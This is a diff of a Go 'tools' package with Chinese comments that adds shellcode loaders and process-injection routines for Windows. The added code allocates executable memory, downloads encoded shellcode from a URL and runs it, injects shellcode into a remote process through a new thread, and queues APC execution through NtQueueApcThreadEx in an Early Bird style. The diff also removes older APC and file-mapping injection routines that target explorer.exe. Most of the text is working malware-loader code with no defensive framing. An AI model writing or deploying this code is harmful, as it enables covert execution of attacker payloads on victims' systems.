@@ -3,10 +3,79 @@ package tools
 import (
 	"fmt"
 	"golang.org/x/sys/windows"
+	"io"
+	"net/http"
 	"os"
 	"syscall"
 	"unsafe"
 )
+
+const (
+	MEM_COMMIT        = 0x1000
+	MEM_RESERVE       = 0x2000
+	PAGE_EXECUTE_READ = 0x20
+	PAGE_READWRITE    = 0x04
+)
+
+const (
+	QUEUE_USER_APC_FLAGS_NONE = iota
+	QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
+	QUEUE_USER_APC_FLGAS_MAX_VALUE
+)
+
+func checkErr(err error) {
+	if err != nil { //如果内存调用出现错误，可以报出
+		if err.Error() != "The operation completed successfully." { //如果调用dll系统发出警告，但是程序运行成功，则不进行警报
+			println(err.Error()) //报出具体错误
+			os.Exit(1)
+		}
+	}
+}
+
+func original_loader(shellcode []byte) {
+	var (
+		kernel32      = syscall.MustLoadDLL("kernel32.dll")   //调用kernel32.dll
+		ntdll         = syscall.MustLoadDLL("ntdll.dll")      //调用ntdll.dll
+		VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc") //使用kernel32.dll调用ViretualAlloc函数
+		RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")   //使用ntdll调用RtCopyMemory函数
+	)
+	//调用VirtualAlloc为shellcode申请一块内存
+	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+	if addr == 0 {
+		checkErr(err)
+	}
+	//调用RtlCopyMemory来将shellcode加载进内存当中
+	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	checkErr(err)
+	//syscall来运行shellcode
+	_, _, _ = syscall.SyscallN(addr, 0, 0, 0, 0)
+}
+
+func OriginalLoader(fp string) {
+	encodeDataByte, err := os.ReadFile(fp)
+	if err != nil {
+		fmt.Printf("读取文件时出错: %v\n", err)
+	}
+	shellcode := Decode(encodeDataByte)
+	original_loader(shellcode)
+}
+
+func Remote_loader(url string) []byte {
+	resp, err := http.Get(url)
+	if err != nil {
+		fmt.Println("error when getting remote connection")
+		return nil
+	}
+	defer resp.Body.Close()
+	encodeDataByte, err := io.ReadAll(resp.Body)
+	if err != nil {
+		fmt.Println("error when getting remote connection")
+		return nil
+	}
+	shellcode := Decode(encodeDataByte)
+	original_loader(shellcode)
+	return nil
+}
 
 func createProcess(processName string) (windows.Handle, error) {
 	processID, err := getProcessIdByName(processName)
@@ -41,6 +110,37 @@ func getProcessHandleByName(processName string) (windows.Handle, error) {
 			return 0, err
 		}
 	}
+}
+
+func GetAllProcessIdByName(processName string) ([]uint32, error) {
+	var processIDs []uint32
+	var processSnap windows.Handle
+	var pe32 windows.ProcessEntry32
+	pe32.Size = uint32(unsafe.Sizeof(pe32))
+
+	processSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
+	if err != nil {
+		return nil, err
+	}
+	defer windows.CloseHandle(processSnap)
+
+	if err := windows.Process32First(processSnap, &pe32); err != nil {
+		return nil, err
+	}
+
+	for {
+		currentProcessName := syscall.UTF16ToString(pe32.ExeFile[:])
+		if currentProcessName == processName {
+			processIDs = append(processIDs, pe32.ProcessID)
+		}
+		if err := windows.Process32Next(processSnap, &pe32); err != nil {
+			if err == windows.ERROR_NO_MORE_FILES {
+				break
+			}
+			return nil, err
+		}
+	}
+	return processIDs, nil
 }
 
 // 获取pid号
@@ -113,21 +213,16 @@ func writeShellcodeToProcessMemory(hProcess windows.Handle, lpBaseAddress uintpt
 	return err
 }
 
-// 通过pid获取所有线程
-func getAllThreadIdByProcessId(processID uint32) (uint32, error) {
+// 通过pid获取线程
+func getThreadIdByProcessId(processID uint32) (uint32, error) {
 	//bufferLength := uint32(1000)
 	var te32 windows.ThreadEntry32
 	te32.Size = uint32(unsafe.Sizeof(te32))
 
-	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
-	if err != nil {
-		return 0, err
-	}
+	hSnapshot, _ := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
 	defer windows.CloseHandle(hSnapshot)
 
-	if err := windows.Thread32First(hSnapshot, &te32); err != nil {
-		return 0, err
-	}
+	_ = windows.Thread32First(hSnapshot, &te32)
 
 	for {
 		if te32.OwnerProcessID == processID {
@@ -164,22 +259,21 @@ func createRemoteThreadToExecute(hProcess windows.Handle, lpBaseAddress uintptr)
 }
 
 // 插入apc
-func setupAPC(lpBaseAddress uintptr, hThread windows.Handle) error {
-	kernel32Handle, err := windows.LoadLibrary("kernel32.dll")
-	if err != nil {
-		return err
-	}
-	defer windows.FreeLibrary(kernel32Handle)
+func setupAPC(addr uintptr) error {
+	const (
+		QUEUE_USER_APC_FLAGS_NONE = iota
+		QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
+		QUEUE_USER_APC_FLGAS_MAX_VALUE
+	)
 
-	queueUserAPCAddr, err := windows.GetProcAddress(kernel32Handle, "QueueUserAPC")
-	if err != nil {
-		return err
-	}
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	GetCurrentThread := kernel32.NewProc("GetCurrentThread")
+	NtQueueApcThreadEx := ntdll.NewProc("NtQueueApcThreadEx")
 
-	_, _, err = syscall.SyscallN(queueUserAPCAddr,
-		uintptr(lpBaseAddress),
-		uintptr(hThread),
-		0)
+	thread, _, err := GetCurrentThread.Call()
+
+	_, _, err = NtQueueApcThreadEx.Call(thread, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr(addr), 0, 0, 0)
 	return err
 }
 
@@ -190,8 +284,27 @@ func memcpy(dst, src unsafe.Pointer, n uintptr) {
 	}
 }
 
+// 分配内存-写入shellcode-修改可读可写内存为可读可执行
+func allocateAndProtectMemory(shellcode []byte) (uintptr, error) {
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
+
+	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
+	VirtualProtect := kernel32.NewProc("VirtualProtect")
+	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
+
+	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+
+	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+
+	oldProtect := PAGE_READWRITE
+	_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+
+	return addr, nil
+}
+
 // 寻找pid 然后打开进程 申请空间后注入 最后通过新线程执行
-func DirectShellcodeInject(fp string) error {
+func ThreadShellcodeInject(fp string) error {
 	encodeDataByte, err := os.ReadFile(fp)
 	if err != nil {
 		fmt.Printf("读取文件时出错: %v\n", err)
@@ -203,182 +316,25 @@ func DirectShellcodeInject(fp string) error {
 
 	// 在目标进程中分配内存
 	lpBaseAddress, err := allocateMemoryInProcess(hProcess, shellcode)
-
-	//if err != nil {
-	//	return err
-	//}
-
 	// 向目标进程内存写入shellcode
 	err = writeShellcodeToProcessMemory(hProcess, lpBaseAddress, shellcode)
-	//if err != nil {
-	//	return err
-	//}
-
 	// 创建远程线程来执行注入的代码
 	err = createRemoteThreadToExecute(hProcess, lpBaseAddress)
-	//if err != nil {
-	//	return err
-	//}
 
-	return nil
-}
-
-// 前面同理 执行是依靠找到一个线程句柄后插入apc队列
-func ApcShellcodeInject(fp string) error {
-	encodeDataByte, err := os.ReadFile(fp)
-	if err != nil {
-		fmt.Printf("读取文件时出错: %v\n", err)
-	}
-	shellcode := Decode(encodeDataByte)
-	var hProcess windows.Handle
-	var hThread windows.Handle
-	var processID uint32
-	var threadID uint32
-	// 获取explorer.exe进程ID
-	processID, err = getProcessIdByName("explorer.exe")
-
-	// 获取explorer.exe进程句柄
-	hProcess, err = getProcessHandleByName("explorer.exe")
-	defer windows.CloseHandle(hProcess)
-
-	// 在目标进程中分配内存
-	lpBaseAddress, err := allocateMemoryInProcess(hProcess, shellcode)
-
-	// 向目标进程内存写入shellcode
-	err = writeShellcodeToProcessMemory(hProcess, lpBaseAddress, shellcode)
-
-	// 获取目标进程的一个线程ID
-	threadID, err = getAllThreadIdByProcessId(processID)
-
-	// 获取目标进程的线程句柄 0x001F03FF --》THREAD_ALL_ACCESS
-	hThread, err = windows.OpenThread(0x001F03FF, false, threadID)
-	defer windows.CloseHandle(hThread)
-
-	// 设置异步过程调用（APC）
-	err = setupAPC(lpBaseAddress, hThread)
 	return nil
 }
 
 // 创建一个RWX的进程，通过apc注入shellcode到线程中
-func EaybirlInject(fp string) error {
+func EarlybirlInject(fp string) error {
+
 	encodeDataByte, err := os.ReadFile(fp)
 	if err != nil {
 		fmt.Printf("读取文件时出错: %v\n", err)
 	}
 	shellcode := Decode(encodeDataByte)
-	hProcess, err := createProcess("explorer.exe")
-	if err != nil {
-		return err
-	}
-	defer windows.CloseHandle(hProcess)
+	
+	addr, _ := allocateAndProtectMemory(shellcode)
+	setupAPC(addr)
 
-	// 在进程地址上分配内存
-	lpBaseAddress, err := allocateMemoryInProcess(hProcess, shellcode)
-	if err != nil {
-		return err
-	}
-
-	// 向分配的内存中写入shellcode
-	if err := writeShellcodeToProcessMemory(hProcess, lpBaseAddress, shellcode); err != nil {
-		return err
-	}
-	// 通过进程ID获取所有线程，这里只取第一个线程进行后续操作（可根据实际需求调整）
-	threadID, err := getAllThreadIdByProcessId(uint32(hProcess))
-	if err != nil {
-		return err
-	}
-	hThread, err := windows.OpenThread(0x001F03FF, false, threadID)
-	if err != nil {
-		return err
-	}
-	defer windows.CloseHandle(hThread)
-	setupAPC(uintptr(unsafe.Pointer(&shellcode[0])), hThread)
-
-	return nil
-}
-
-// 内存映射注入shellcode
-func MappingInject(fp string) error {
-	encodeDataByte, err := os.ReadFile(fp)
-	if err != nil {
-		fmt.Printf("读取文件时出错: %v\n", err)
-	}
-	shellcode := Decode(encodeDataByte)
-	var si windows.StartupInfo
-	//var pi windows.ProcessInformation
-	si.Cb = uint32(unsafe.Sizeof(si))
-
-	// 创建文件映射对象，这里使用INVALID_HANDLE_VALUE对应的Go表示形式（通常为0或特定的无效值定义）
-	hMapping, err := windows.CreateFileMapping(0, nil, windows.PAGE_EXECUTE_READWRITE, 0, 0, nil)
-	if err != nil {
-		// 处理错误，这里简单打印，实际可根据需求更细化处理
-		println("创建文件映射对象失败:", err)
-		return nil
-	}
-	defer windows.CloseHandle(hMapping)
-
-	// 将文件映射对象映射到当前进程的地址空间
-	lpMapAddress, err := windows.MapViewOfFile(hMapping, windows.FILE_MAP_WRITE, 0, 0, 0)
-	if err != nil {
-		println("映射文件到当前进程地址空间失败:", err)
-		return nil
-	}
-	defer windows.UnmapViewOfFile(lpMapAddress)
-
-	// 使用自定义的memcpy函数将shellcode复制到映射的内存地址
-	memcpy(unsafe.Pointer(lpMapAddress), unsafe.Pointer(&shellcode[0]), uintptr(len(shellcode)))
-
-	// 创建目标进程（这里以notepad.exe为例，可根据需求替换进程名）
-	hProcess, err := createProcess("explorer.exe")
-	if err != nil {
-		println("创建进程失败:", err)
-		return nil
-	}
-	defer windows.CloseHandle(hProcess)
-
-	// 将文件映射对象映射到目标进程的地址空间，这里需要注意参数等要符合要求
-	lpMapAddressRemote, err := allocateMemoryInProcess(hProcess, shellcode)
-	if err != nil {
-		// 处理错误
-		return nil
-	}
-
-	// 将当前进程中的shellcode写入目标进程的内存
-	err = writeShellcodeToProcessMemory(hProcess, lpMapAddressRemote, shellcode)
-	if err != nil {
-		// 处理错误
-		return nil
-	}
-
-	defer windows.UnmapViewOfFile(lpMapAddressRemote)
-
-	// 获取目标进程的一个线程ID
-	threadID, err := getAllThreadIdByProcessId(uint32(hProcess))
-	if err != nil {
-		println("获取线程ID失败:", err)
-		return nil
-	}
-
-	// 获取目标进程的线程句柄
-	hThread, err := windows.OpenThread(0x001F03FF, false, threadID)
-	if err != nil {
-		println("获取线程句柄失败:", err)
-		return nil
-	}
-	defer windows.CloseHandle(hThread)
-
-	// 设置异步过程调用（APC）
-	err = setupAPC(uintptr(lpMapAddressRemote), hThread)
-	if err != nil {
-		println("设置APC调用失败:", err)
-		return nil
-	}
-
-	// 恢复线程执行，使线程有机会执行APC中的代码（shellcode）
-	_, err = windows.ResumeThread(hThread)
-	if err != nil {
-		println("恢复线程执行失败:", err)
-		return nil
-	}
 	return nil
 }
